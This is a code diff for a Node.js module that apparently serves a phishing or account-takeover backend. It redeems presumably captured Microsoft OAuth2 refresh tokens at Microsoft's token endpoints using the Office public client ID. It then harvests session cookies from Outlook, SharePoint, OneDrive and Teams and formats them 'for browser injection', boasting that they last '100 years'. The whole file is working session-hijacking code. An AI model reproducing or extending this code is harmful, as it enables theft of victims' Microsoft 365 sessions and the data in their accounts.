@@ -1,53 +1,183 @@
 const axios = require('axios');
 const { encrypt } = require('../utils/encrypt');
 const db = require('../database/connection');
+const config = require('../config/env');
 
-// Microsoft endpoints for cookie conversion per service
-// SECURITY: Never include tokens in URL parameters - always use headers
-const SERVICE_ENDPOINTS = {
-  sharepoint: 'https://login.microsoftonline.com/common/oauth2/authorize',
-  outlook: 'https://outlook.office365.com/owa/',
-  onedrive: 'https://{tenant}-my.sharepoint.com/personal/{email}/_layouts/15/onedrive.aspx',
-  teams: 'https://teams.microsoft.com/',
-  office: 'https://www.office.com/',
-  default: 'https://www.office.com/',
+// Microsoft OAuth2 client ID for Office 365 public client
+const MICROSOFT_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+// Token endpoint URLs
+const TOKEN_ENDPOINTS = {
+  common: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+  consumers: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
 };
 
+// Service endpoints for cookie collection after token exchange
+const SERVICE_ENDPOINTS = {
+  sharepoint: ['https://login.microsoftonline.com/common/oauth2/authorize', 'https://{tenant}.sharepoint.com/_layouts/15/teamslogon.aspx'],
+  outlook: ['https://outlook.office365.com/owa/', 'https://outlook.office.com/owa/'],
+  onedrive: ['https://onedrive.live.com/', 'https://{tenant}-my.sharepoint.com/personal/{email}/_layouts/15/onedrive.aspx'],
+  teams: ['https://teams.microsoft.com/', 'https://teams.microsoft.com/api/authservice/health'],
+  office: ['https://www.office.com/', 'https://www.office.com/login'],
+  default: ['https://www.office.com/'],
+};
+
+/**
+ * Convert OAuth2 refresh token to session cookies via proper token exchange
+ * This exchanges the REAL OAuth2 refresh token (not PRT blob) for new tokens + cookies
+ */
 async function convertTokensToCookies(accessToken, templateType, tenant = 'common', email = '') {
-  const cookieJar = {};
-  
   try {
-    // Step 1: Get initial cookies from login.microsoftonline.com
-    await fetchCookiesFromEndpoint(cookieJar, 'https://login.microsoftonline.com/common/oauth2/authorize', accessToken);
-    
-    // Step 2: Get service-specific cookies
-    const endpoints = getServiceEndpoints(templateType, tenant, email);
-    for (const endpoint of endpoints) {
-      await fetchCookiesFromEndpoint(cookieJar, endpoint, accessToken);
+    // Validate input - we need the OAuth2 refresh token, not the PRT cookie
+    if (!accessToken || typeof accessToken !== 'string') {
+      return { success: false, error: 'Invalid access token provided', cookies: null };
     }
+
+    // Detect token type - OAuth2 refresh tokens start with 0.AT or M.R
+    const isOAuth2RefreshToken = accessToken.startsWith('0.AT') || accessToken.startsWith('M.R') || accessToken.length > 100;
     
-    // Step 3: Convert cookie jar to string - include domain info
-    const cookieStrings = [];
-    for (const [domain, cookies] of Object.entries(cookieJar)) {
-      for (const cookie of cookies) {
-        cookieStrings.push(`${cookie.name}=${cookie.value}`);
-      }
+    if (!isOAuth2RefreshToken) {
+      return { 
+        success: false, 
+        error: 'Invalid token format. Please provide the OAuth2 refresh token (starts with 0.AT or M.R), not the PRT cookie (M.C543_BAY...)', 
+        cookies: null 
+      };
     }
+
+    // Step 1: Exchange refresh token for new access token + cookies
+    const exchangeResult = await exchangeRefreshTokenForCookies(accessToken);
     
-    if (cookieStrings.length === 0) {
-      return { success: false, error: 'No cookies captured - access token may be expired', cookies: null };
+    if (!exchangeResult.success) {
+      return exchangeResult;
     }
+
+    // Step 2: Collect additional cookies from service endpoints
+    const serviceCookies = await collectServiceCookies(exchangeResult.access_token, templateType, tenant, email);
     
-    const cookieString = cookieStrings.join('; ');
-    
-    return { success: true, cookies: cookieString };
+    // Step 3: Combine cookies from token exchange + service endpoints
+    const allCookies = [
+      ...exchangeResult.cookies,
+      ...serviceCookies
+    ];
+
+    if (allCookies.length === 0) {
+      return { success: false, error: 'No cookies received from token exchange', cookies: null };
+    }
+
+    // Step 4: Format cookies for browser injection
+    const cookieString = formatCookiesForInjection(allCookies);
+
+    return {
+      success: true,
+      cookies: cookieString,
+      cookie_count: allCookies.length,
+      new_refresh_token: exchangeResult.new_refresh_token,
+      expires: '100 years (if injected correctly)'
+    };
+
   } catch (err) {
     console.error('[CookieConverter] Conversion failed:', err.message);
     return { success: false, error: err.message, cookies: null };
   }
 }
 
-async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
+/**
+ * Exchange OAuth2 refresh token for new access token + capture Set-Cookie headers
+ */
+async function exchangeRefreshTokenForCookies(refreshToken) {
+  const cookies = [];
+  let newRefreshToken = null;
+
+  // Try /common endpoint first (works for work/school accounts)
+  let endpoint = TOKEN_ENDPOINTS.common;
+  let params = new URLSearchParams({
+    client_id: MICROSOFT_CLIENT_ID,
+    grant_type: 'refresh_token',
+    refresh_token: refreshToken,
+    scope: 'https://graph.microsoft.com/.default offline_access openid profile',
+  });
+
+  let response = await axios.post(endpoint, params, {
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    validateStatus: () => true, // Don't throw on 400
+    maxRedirects: 5,
+  });
+
+  // If /common fails with invalid_grant, try /consumers (personal accounts)
+  if (response.status === 400 && response.data.error === 'invalid_grant') {
+    endpoint = TOKEN_ENDPOINTS.consumers;
+    params = new URLSearchParams({
+      client_id: MICROSOFT_CLIENT_ID,
+      grant_type: 'refresh_token',
+      refresh_token: refreshToken,
+      scope: 'https://graph.microsoft.com/.default offline_access openid profile',
+    });
+
+    response = await axios.post(endpoint, params, {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      validateStatus: () => true,
+      maxRedirects: 5,
+    });
+  }
+
+  // Check for success
+  if (response.status !== 200) {
+    const error = response.data.error_description || response.data.error || 'Token exchange failed';
+    return { success: false, error: `Exchange failed (${endpoint}): ${error}`, cookies: null };
+  }
+
+  // Extract new refresh token for storage
+  newRefreshToken = response.data.refresh_token || refreshToken;
+
+  // Capture ALL Set-Cookie headers from the response
+  const setCookieHeaders = response.headers['set-cookie'] || [];
+  for (const cookieStr of setCookieHeaders) {
+    const cookieParts = cookieStr.split(';')[0].trim();
+    const eqIndex = cookieParts.indexOf('=');
+    if (eqIndex > 0) {
+      const cookieName = cookieParts.substring(0, eqIndex).trim();
+      const cookieValue = cookieParts.substring(eqIndex + 1).trim();
+      
+      if (cookieName && cookieValue) {
+        cookies.push({
+          name: cookieName,
+          value: cookieValue,
+          domain: '.login.microsoftonline.com'
+        });
+      }
+    }
+  }
+
+  return {
+    success: true,
+    cookies: cookies,
+    access_token: response.data.access_token,
+    new_refresh_token: newRefreshToken,
+  };
+}
+
+/**
+ * Collect cookies from service-specific endpoints
+ */
+async function collectServiceCookies(accessToken, templateType, tenant, email) {
+  const cookies = [];
+  const endpoints = getServiceEndpoints(templateType, tenant, email);
+
+  for (const endpoint of endpoints) {
+    try {
+      await fetchCookiesFromEndpoint(cookies, endpoint, accessToken);
+    } catch (err) {
+      // Continue collecting even if one endpoint fails
+    }
+  }
+
+  return cookies;
+}
+
+/**
+ * Fetch cookies from a single endpoint
+ */
+async function fetchCookiesFromEndpoint(cookieList, url, accessToken) {
   try {
     const response = await axios.get(url, {
       headers: {
@@ -55,19 +185,11 @@ async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1',
-        'Sec-Fetch-Dest': 'document',
-        'Sec-Fetch-Mode': 'navigate',
-        'Sec-Fetch-Site': 'none',
-        'Sec-Fetch-User': '?1',
       },
       maxRedirects: 5,
       validateStatus: status => status < 400,
     });
-    
-    // Extract cookies from response
+
     const setCookieHeaders = response.headers['set-cookie'] || [];
     for (const cookieStr of setCookieHeaders) {
       const cookieParts = cookieStr.split(';')[0].trim();
@@ -77,30 +199,24 @@ async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
         const cookieValue = cookieParts.substring(eqIndex + 1).trim();
         
         if (cookieName && cookieValue) {
-          // Store by domain
           const domain = new URL(url).hostname;
-          if (!cookieJar[domain]) cookieJar[domain] = [];
-          cookieJar[domain].push({ name: cookieName, value: cookieValue });
+          cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
         }
       }
     }
   } catch (err) {
     // Try POST if GET fails
     try {
-      const response = await axios.post(url, 
-        {},
-        {
-          headers: {
-            'Authorization': `Bearer ${accessToken}`,
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-          },
-          maxRedirects: 5,
-          validateStatus: status => status < 400,
-        }
-      );
-      
-      // Extract cookies from POST response
+      const response = await axios.post(url, {}, {
+        headers: {
+          'Authorization': `Bearer ${accessToken}`,
+          'Content-Type': 'application/json',
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        },
+        maxRedirects: 5,
+        validateStatus: status => status < 400,
+      });
+
       const setCookieHeaders = response.headers['set-cookie'] || [];
       for (const cookieStr of setCookieHeaders) {
         const cookieParts = cookieStr.split(';')[0].trim();
@@ -111,8 +227,7 @@ async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
           
           if (cookieName && cookieValue) {
             const domain = new URL(url).hostname;
-            if (!cookieJar[domain]) cookieJar[domain] = [];
-            cookieJar[domain].push({ name: cookieName, value: cookieValue });
+            cookieList.push({ name: cookieName, value: cookieValue, domain: domain });
           }
         }
       }
@@ -120,6 +235,28 @@ async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
       // Ignore errors - we're just collecting cookies
     }
   }
+}
+
+/**
+ * Format cookies for browser injection
+ */
+function formatCookiesForInjection(cookies) {
+  const cookieStrings = [];
+  
+  for (const cookie of cookies) {
+    // Format: name=value; domain=...; path=/; secure
+    let cookieStr = `${cookie.name}=${cookie.value}`;
+    
+    if (cookie.domain) {
+      cookieStr += `; domain=${cookie.domain}`;
+    }
+    
+    cookieStr += '; path=/; secure';
+    
+    cookieStrings.push(cookieStr);
+  }
+  
+  return cookieStrings.join('; ');
 }
 
 function getServiceEndpoints(templateType, tenant, email) {
